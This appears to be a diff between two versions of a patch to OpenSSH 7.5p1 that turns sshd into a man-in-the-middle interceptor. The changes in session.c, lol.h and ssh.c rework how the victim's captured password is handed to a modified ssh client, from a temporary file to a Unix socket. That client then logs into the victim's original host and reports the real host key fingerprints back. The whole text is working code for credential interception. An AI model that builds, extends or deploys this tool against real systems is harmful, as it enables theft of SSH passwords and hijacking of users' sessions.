@@ -516,7 +516,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		logit("Attempt to write login records by non-root user (aborting)");
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
 --- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
-+++ openssh-7.5p1-mitm/lol.h	2017-07-24 22:51:06.546915576 -0400
++++ openssh-7.5p1-mitm/lol.h	2017-07-25 12:12:34.326866390 -0400
 @@ -0,0 +1,49 @@
 +#ifndef LOL_H
 +#define LOL_H
@@ -539,9 +539,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +/* The path to the modified ssh client. */
 +#define MITM_SSH_CLIENT MITM_ROOT "/bin/ssh"
 +
-+/* This is the size of the buffer used to read host key fingerprints from the
-+ * client program. */
-+#define SOCKET_FINGERPRINT_BUFFER_SIZE 1024
++/* This is the size of the buffer used to write the password and read host key
++ * fingerprints to/from the client program. */
++#define SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE 1024
 +
 +/* The size of the buffer used to store partial fingerprints intercepted. */
 +#define EXTRA_FP_BYTES_SIZE 64
@@ -749,7 +749,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
 --- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/session.c	2017-07-24 22:53:37.670050007 -0400
++++ openssh-7.5p1-mitm/session.c	2017-07-25 13:23:28.910238555 -0400
 @@ -40,6 +40,9 @@
  #ifdef HAVE_SYS_STAT_H
  # include <sys/stat.h>
@@ -810,9 +810,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 + * writing. */
 +#define MAX_LOG_OPEN_TRIES 1048576 /* 1M */
 +
-+char *create_fingerprint_socket(int *sock_fd);
++char *create_password_and_fingerprint_socket(int *sock_fd);
 +int get_session_log_fd(void);
-+void read_fingerprints(char **fingerprint_socket_name, int sock_fd, struct ssh *, Channel *c);
++void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *, Channel *c);
 +
  /* removes the agent forwarding socket */
  
@@ -822,7 +822,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
   */
  int
 -do_exec_no_pty(Session *s, const char *command)
-+do_exec_no_pty(Session *s, const char *command, char *fingerprint_file)
++do_exec_no_pty(Session *s, const char *command, char *password_and_fingerprint_socket_name)
  {
  	pid_t pid;
 +	int session_log_fd;
@@ -834,7 +834,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  
  		/* Do processing for the child (exec command etc). */
 -		do_child(s, command);
-+		do_child(s, command, fingerprint_file);
++		do_child(s, command, password_and_fingerprint_socket_name);
  		/* NOTREACHED */
  	default:
  		break;
@@ -870,7 +870,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
   */
  int
 -do_exec_pty(Session *s, const char *command)
-+do_exec_pty(Session *s, const char *command, char *fingerprint_file)
++do_exec_pty(Session *s, const char *command, char *password_and_fingerprint_socket_name)
  {
  	int fdout, ptyfd, ttyfd, ptymaster;
  	pid_t pid;
@@ -883,7 +883,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  		 * the command.
  		 */
 -		do_child(s, command);
-+		do_child(s, command, fingerprint_file);
++		do_child(s, command, password_and_fingerprint_socket_name);
  		/* NOTREACHED */
  	default:
  		break;
@@ -902,32 +902,33 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	const char *forced = NULL, *tty = NULL;
  	char session_type[1024];
 +	int sock_fd = -1;
-+	char *fingerprint_socket_name = NULL;
++	char *password_and_fingerprint_socket_name = NULL;
  
  	if (options.adm_forced_command) {
  		original_command = command;
-@@ -673,10 +694,18 @@
+@@ -673,10 +694,19 @@
  		PRIVSEP(audit_run_command(shell));
  	}
  #endif
 +
 +	/* Create a socket for the ssh client program to output its host key
 +	 * fingerprints back to us. */
-+	fingerprint_socket_name = create_fingerprint_socket(&sock_fd);
++	password_and_fingerprint_socket_name = create_password_and_fingerprint_socket(&sock_fd);
 +
  	if (s->ttyfd != -1)
 -		ret = do_exec_pty(s, command);
-+		ret = do_exec_pty(s, command, fingerprint_socket_name);
++		ret = do_exec_pty(s, command, password_and_fingerprint_socket_name);
  	else
 -		ret = do_exec_no_pty(s, command);
-+		ret = do_exec_no_pty(s, command, fingerprint_socket_name);
++		ret = do_exec_no_pty(s, command, password_and_fingerprint_socket_name);
 +
-+	/* Read the client's host key fingerprints into the Channel struct. */
-+	read_fingerprints(&fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
++	/* Write the password and read the client's host key fingerprints into
++	 * the Channel struct. */
++	write_password_and_read_fingerprints(&password_and_fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
  
  	original_command = NULL;
  
-@@ -1416,6 +1445,8 @@
+@@ -1416,6 +1446,8 @@
  #ifdef WITH_SELINUX
  		setexeccon(NULL);
  #endif
@@ -936,16 +937,16 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  #ifdef PASSWD_NEEDS_USERNAME
  		execl(_PATH_PASSWD_PROG, "passwd", s->pw->pw_name,
  		    (char *)NULL);
-@@ -1475,7 +1506,7 @@
+@@ -1475,7 +1507,7 @@
   */
  #define ARGV_MAX 10
  void
 -do_child(Session *s, const char *command)
-+do_child(Session *s, const char *command, char *fingerprint_file)
++do_child(Session *s, const char *command, char *password_and_fingerprint_socket_name)
  {
  	extern char **environ;
  	char **env;
-@@ -1628,9 +1659,14 @@
+@@ -1628,9 +1660,14 @@
  #ifdef WITH_SELINUX
  		ssh_selinux_change_context("sftpd_t");
  #endif
@@ -962,21 +963,19 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	fflush(NULL);
  
  	/* Get the last component of the shell name. */
-@@ -1646,6 +1682,13 @@
+@@ -1646,6 +1683,11 @@
  	 */
  	if (!command) {
  		char argv0[256];
 +		char connect_string[512];
 +		char port[16];
-+		char password_file[] = "/tmp/lolXXXXXX";
-+		int fd = -1;
 +
 +		memset(connect_string, 0, sizeof(connect_string));
 +		memset(port, 0, sizeof(port));
  
  		/* Start the shell.  Set initial character to '-'. */
  		argv0[0] = '-';
-@@ -1658,9 +1701,44 @@
+@@ -1658,9 +1700,33 @@
  		}
  
  		/* Execute the shell. */
@@ -999,31 +998,20 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +		strlcat(connect_string, lol->original_host, sizeof(connect_string));
 +		#endif
 +
-+		/* Write the password to a temporary file.  The ssh program will delete this after reading it. */
-+		fd = mkstemp(password_file);
-+		if (fd < 0) {
-+		  logit("MITM: Error: could not create temp password file for ssh client! [%s]", password_file);
-+		  exit(-1);
-+		}
-+		write(fd, lol->password, strlen(lol->password));
-+		close(fd);
-+
 +		debug3("MITMing connection to %s:%s", connect_string, port);
 +
 +		argv[0] = MITM_SSH_CLIENT;
 +		argv[1] = "-Z";
-+		argv[2] = password_file;
-+		argv[3] = "-z";
-+		argv[4] = fingerprint_file;
-+		argv[5] = "-p";
-+		argv[6] = port;
-+		argv[7] = connect_string;
-+		argv[8] = NULL;
++		argv[2] = password_and_fingerprint_socket_name;
++		argv[3] = "-p";
++		argv[4] = port;
++		argv[5] = connect_string;
++		argv[6] = NULL;
 +		execve(argv[0], argv, env);
  
  		/* Executing the shell failed. */
  		perror(shell);
-@@ -1672,7 +1750,39 @@
+@@ -1672,7 +1738,39 @@
  	 */
  	argv[0] = (char *) shell0;
  	argv[1] = "-c";
@@ -1064,7 +1052,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	argv[3] = NULL;
  	execve(shell, argv, env);
  	perror(shell);
-@@ -1927,6 +2037,11 @@
+@@ -1927,6 +2025,11 @@
  	debug2("subsystem request for %.100s by user %s", s->subsys,
  	    s->pw->pw_name);
  
@@ -1076,7 +1064,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	for (i = 0; i < options.num_subsystems; i++) {
  		if (strcmp(s->subsys, options.subsystem_name[i]) == 0) {
  			prog = options.subsystem_command[i];
-@@ -1958,6 +2073,10 @@
+@@ -1958,6 +2061,10 @@
  {
  	int success;
  
@@ -1087,7 +1075,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	if (s->auth_proto != NULL || s->auth_data != NULL) {
  		error("session_x11_req: session %d: "
  		    "x11 forwarding already active", s->self);
-@@ -1999,6 +2118,12 @@
+@@ -1999,6 +2106,12 @@
  
  	char *command = packet_get_string(&len);
  	packet_check_eom();
@@ -1100,7 +1088,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	success = do_exec(s, command) == 0;
  	free(command);
  	return success;
-@@ -2022,6 +2147,10 @@
+@@ -2022,6 +2135,10 @@
  	char *name, *val;
  	u_int name_len, val_len, i;
  
@@ -1111,7 +1099,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	name = packet_get_cstring(&name_len);
  	val = packet_get_cstring(&val_len);
  	packet_check_eom();
-@@ -2056,6 +2185,11 @@
+@@ -2056,6 +2173,11 @@
  {
  	static int called = 0;
  	packet_check_eom();
@@ -1123,7 +1111,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
  		debug("session_auth_agent_req: no_agent_forwarding_flag");
  		return 0;
-@@ -2113,7 +2247,7 @@
+@@ -2113,7 +2235,7 @@
  
  void
  session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
@@ -1132,7 +1120,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  {
  	/*
  	 * now that have a child and a pipe to the child,
-@@ -2124,7 +2258,7 @@
+@@ -2124,7 +2246,7 @@
  	channel_set_fds(s->chanid,
  	    fdout, fdin, fderr,
  	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
@@ -1141,7 +1129,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  }
  
  /*
-@@ -2532,6 +2666,10 @@
+@@ -2532,6 +2654,10 @@
  	if (authctxt == NULL)
  		return;
  
@@ -1152,7 +1140,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  #ifdef USE_PAM
  	if (options.use_pam) {
  		sshpam_cleanup();
-@@ -2578,3 +2716,169 @@
+@@ -2578,3 +2704,186 @@
  	return remote;
  }
  
@@ -1196,12 +1184,12 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +/* Creates a unique socket and listens on it.  Returns its filename and sets
 + * the "sock_fd" argument to the socket handle.  The caller must free() the
 + * return value. */
-+char *create_fingerprint_socket(int *sock_fd) {
-+  char *fingerprint_socket_name = NULL;
++char *create_password_and_fingerprint_socket(int *sock_fd) {
++  char *password_and_fingerprint_socket_name = NULL;
 +  struct sockaddr_un addr;
 +  char socket_prefix[] = MITM_ROOT "/tmp/socket_";
 +  int counter = 0;
-+  int fingerprint_socket_name_len = sizeof(socket_prefix) + 5;
++  int password_and_fingerprint_socket_name_len = sizeof(socket_prefix) + 5;
 +
 +  /* Create a new socket. */
 +  memset(&addr, 0, sizeof(addr));
@@ -1213,15 +1201,15 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +  }
 +
 +  /* Allocate a return buffer to hold the socket filename. */
-+  if ((fingerprint_socket_name = calloc(fingerprint_socket_name_len, sizeof(char))) == NULL) {
++  if ((password_and_fingerprint_socket_name = calloc(password_and_fingerprint_socket_name_len, sizeof(char))) == NULL) {
 +    *sock_fd = -1;
 +    return strdup("");
 +  }
 +
 +  /* Make a new, unique socket file path. */
 +  while (counter < 1024) {
-+    snprintf(fingerprint_socket_name, fingerprint_socket_name_len, "%s%d", socket_prefix, counter);
-+    strlcpy(addr.sun_path, fingerprint_socket_name , sizeof(addr.sun_path));
++    snprintf(password_and_fingerprint_socket_name, password_and_fingerprint_socket_name_len, "%s%d", socket_prefix, counter);
++    strlcpy(addr.sun_path, password_and_fingerprint_socket_name , sizeof(addr.sun_path));
 +    if (bind(*sock_fd, (struct sockaddr *)&addr, sizeof(addr)) == 0)
 +      break;
 +
@@ -1232,21 +1220,39 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +  if (listen(*sock_fd, 1) == -1) {
 +    logit("MITM: Error while listening on socket for fingerprint data!");
 +    shutdown(*sock_fd, SHUT_RDWR);
-+    free(fingerprint_socket_name); fingerprint_socket_name = NULL;
++    free(password_and_fingerprint_socket_name); password_and_fingerprint_socket_name = NULL;
 +    *sock_fd = -1;
 +    return strdup("");
 +  }
 +
-+  return fingerprint_socket_name;
++  return password_and_fingerprint_socket_name;
 +}
 +
-+/* Reads the host key fingerprints from the client program, sets the
-+ * appropriate "legit_*_fingerprint" global variables, deletes the socket, and
-+ * frees the socket name. */
-+void read_fingerprints(char **fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c) {
-+  int client_fd = -1;
-+  char *buffer = calloc(SOCKET_FINGERPRINT_BUFFER_SIZE, sizeof(char));
++/* Writes the password, then reads the host key fingerprints from the client
++ * program, sets the appropriate "legit_*_fingerprint" global variables,
++ * deletes the socket, and frees the socket name. */
++void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c) {
++  int client_fd = -1, written = 0, r = 0;
++  u_int16_t password_len = htons((u_int16_t)strlen(lol->password));
++  char *buffer = NULL;
 +
++  /* Wait for the client to connect, then accept it. */
++  client_fd = accept(sock_fd, NULL, NULL);
++
++  /* Send the password length. */
++  if (send(client_fd, &password_len, sizeof(password_len), 0) < 0)
++    fatal("MITM: Error while sending password length: %d", errno);
++
++  /* Write the password. */
++  while (written < password_len) {
++    r = send(client_fd, lol->password + written, password_len - written, 0);
++    if ((r < 0) && (r != EINTR))
++      fatal("MITM: Error while sending password: %d", errno);
++    else if (r > 0)
++      written += r;
++  }
++
++  buffer = calloc(SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE, sizeof(char));
 +  if ((buffer != NULL) && (c != NULL)) {
 +    int r, bytes_read = 0;
 +    char *saved_buffer = buffer;  /* We use strsep(), so save this pointer. */
@@ -1255,10 +1261,9 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +    struct sshkey *k = NULL;
 +    char *fp = NULL;
 +
-+    /* Accept the client connection, and read everything into buffer. */
-+    client_fd = accept(sock_fd, NULL, NULL);
++    /* Read everything into buffer. */
 +    while (1) {
-+      r = read(client_fd, buffer + bytes_read, SOCKET_FINGERPRINT_BUFFER_SIZE - bytes_read);
++      r = read(client_fd, buffer + bytes_read, SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE - bytes_read);
 +      if (r <= 0)
 +	break;
 +      bytes_read += r;
@@ -1319,8 +1324,8 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +  * free the filename. */
 +  shutdown(client_fd, SHUT_RDWR);
 +  close(sock_fd);
-+  unlink(*fingerprint_socket_name);
-+  free(*fingerprint_socket_name); *fingerprint_socket_name = NULL;
++  unlink(*password_and_fingerprint_socket_name);
++  free(*password_and_fingerprint_socket_name); *password_and_fingerprint_socket_name = NULL;
 +}
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.c openssh-7.5p1-mitm/sftp.c
 --- openssh-7.5p1/sftp.c	2017-03-19 22:39:27.000000000 -0400
@@ -3389,7 +3394,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  }
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
 --- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/ssh.c	2017-07-24 15:25:11.271472637 -0400
++++ openssh-7.5p1-mitm/ssh.c	2017-07-25 13:18:12.104638286 -0400
 @@ -49,6 +49,7 @@
  #include <sys/resource.h>
  #include <sys/ioctl.h>
@@ -3412,22 +3417,21 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  
 +int num_hostkey_fps = 0;
 +hostkey_fp *server_hostkey_fps = NULL;
-+int fingerprint_file_fd = -1;
++int password_and_fingerprint_fd = -1;
 +
  /* Prints a help message to the user.  This function never returns. */
  
  static void
-@@ -524,6 +530,9 @@
+@@ -524,6 +530,8 @@
  	struct addrinfo *addrs = NULL;
  	struct ssh_digest_ctx *md;
  	u_char conn_hash[SSH_DIGEST_MAX_LENGTH];
 +	char *password = NULL;
-+	int fd = -1, bytes_read = 0, ret = 0;
-+	struct stat password_stat;
++	int bytes_read = 0, ret = 0;
  
  	ssh_malloc_init();	/* must be called before any mallocs */
  	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
-@@ -548,6 +557,9 @@
+@@ -548,6 +556,9 @@
  	 */
  	closefrom(STDERR_FILENO + 1);
  
@@ -3437,65 +3441,73 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	/*
  	 * Save the original real uid.  It will be needed later (uid-swapping
  	 * may clobber the real uid).
-@@ -605,8 +617,9 @@
+@@ -605,8 +616,9 @@
  	argv0 = av[0];
  
   again:
 +	/* Add -Z to get the password to use. */
  	while ((opt = getopt(ac, av, "1246ab:c:e:fgi:kl:m:no:p:qstvx"
 -	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYy")) != -1) {
-+	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:z:")) != -1) {
++	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:")) != -1) {
  		switch (opt) {
  		case '1':
  			options.protocol = SSH_PROTO_1;
-@@ -931,6 +944,46 @@
+@@ -931,6 +943,54 @@
  		case 'F':
  			config = optarg;
  			break;
 +		case 'Z':
-+			/* The password is in a temporary file.  We will read it, then delete the file. */
-+			fd = open(optarg, O_RDONLY);
-+			if (fd < 0)
-+				exit(-1);
-+			if (fstat(fd, &password_stat) < 0)
-+				exit(-1);
-+
-+			/* Probably overkill, but hey, read() might not return all bytes... */
-+			password = malloc(password_stat.st_size + 1);
-+			while (bytes_read != password_stat.st_size) {
-+				ret = read(fd, password + bytes_read, password_stat.st_size - bytes_read);
-+				if (ret < 0)
-+					exit(-1);
-+				else
-+					bytes_read += ret;
-+			}
-+			password[password_stat.st_size] = '\0';
-+			close(fd);
-+			unlink(optarg);
-+			break;
-+		case 'z':
 +			/* The argument here is the path to the socket to
-+			 * write server host key fingerprints to.  We will
-+			 * connect to it here, then write them in the
-+			 * write_hostkeys() function. */
++			 * read the password and write server host key
++			 * fingerprints to. */
 +			if (strlen(optarg) > 0) {
 +			  struct sockaddr_un addr;
++			  u_int16_t password_len = 0;
++			  int i = 0;
++			  struct timespec req;
 +
 +			  memset(&addr, 0, sizeof(addr));
 +			  addr.sun_family = AF_UNIX;
-+			  fingerprint_file_fd = socket(AF_UNIX, SOCK_STREAM, 0);
++			  req.tv_sec = 1;
++			  req.tv_nsec = 0;
++			  password_and_fingerprint_fd = socket(AF_UNIX, SOCK_STREAM, 0);
 +
++			  /* Try to connect up to 10 times, pausing 1 second in between each attempt. */
 +			  strlcpy(addr.sun_path, optarg, sizeof(addr.sun_path));
-+			  if (connect(fingerprint_file_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
-+			    shutdown(fingerprint_file_fd, SHUT_RDWR);
-+			    fingerprint_file_fd = -1;
++			  while (i < 10) {
++			    if ((ret = connect(password_and_fingerprint_fd, (struct sockaddr *)&addr, sizeof(addr))) == 0)
++			      break;
++
++			    nanosleep(&req, NULL);
++			    i++;
 +			  }
++
++			  /* If connect() never succeeded, terminate. */
++			  if (ret != 0)
++			    exit(-1);
++
++			  /* Read the password length. */
++			  read(password_and_fingerprint_fd, &password_len, sizeof(password_len));
++			  password_len = ntohs(password_len);
++
++			  if ((password = calloc(password_len + 1, sizeof(char))) == NULL)
++			    exit(-1);
++
++			  /* Read all the bytes to the password. */
++			  while (bytes_read < password_len) {
++			    ret = read(password_and_fingerprint_fd, password + bytes_read, password_len - bytes_read);
++			    if ((ret < 0) && (ret != EINTR))
++			      exit(-1);
++			    else if (ret > 0)
++			      bytes_read += ret;
++			  }
++			  password[password_len] = '\0';
 +			}
 +			break;
  		default:
  			usage();
  		}
-@@ -1292,6 +1345,7 @@
+@@ -1292,6 +1352,7 @@
  	sensitive_data.nkeys = 0;
  	sensitive_data.keys = NULL;
  	sensitive_data.external_keysign = 0;
@@ -3503,7 +3515,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  	if (options.rhosts_rsa_authentication ||
  	    options.hostbased_authentication) {
  		sensitive_data.nkeys = 9;
-@@ -2194,3 +2248,27 @@
+@@ -2194,3 +2255,27 @@
  	signal(sig, main_sigchld_handler);
  	errno = save_errno;
  }
@@ -3511,23 +3523,23 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +void write_hostkeys() {
 +  int i = 0;
 +
-+  if (fingerprint_file_fd == -1)
++  if (password_and_fingerprint_fd == -1)
 +    return;
 +
 +  for(i = 0; i < num_hostkey_fps; i++) {
 +    char *old = server_hostkey_fps[i].old;
 +    char *new = server_hostkey_fps[i].new;
 +
-+    write(fingerprint_file_fd, old, strlen(old));
-+    write(fingerprint_file_fd, "\n", strlen("\n"));
-+    write(fingerprint_file_fd, new, strlen(new));
-+    write(fingerprint_file_fd, "\n", strlen("\n"));
++    send(password_and_fingerprint_fd, old, strlen(old), 0);
++    send(password_and_fingerprint_fd, "\n", strlen("\n"), 0);
++    send(password_and_fingerprint_fd, new, strlen(new), 0);
++    send(password_and_fingerprint_fd, "\n", strlen("\n"), 0);
 +
 +    free(server_hostkey_fps[i].old); server_hostkey_fps[i].old = NULL;
 +    free(server_hostkey_fps[i].new); server_hostkey_fps[i].new = NULL;
 +  }
-+  shutdown(fingerprint_file_fd, SHUT_RDWR);
-+  fingerprint_file_fd = -1;
++  shutdown(password_and_fingerprint_fd, SHUT_RDWR);
++  password_and_fingerprint_fd = -1;
 +  free(server_hostkey_fps); server_hostkey_fps = NULL;
 +  num_hostkey_fps = 0;
 +}
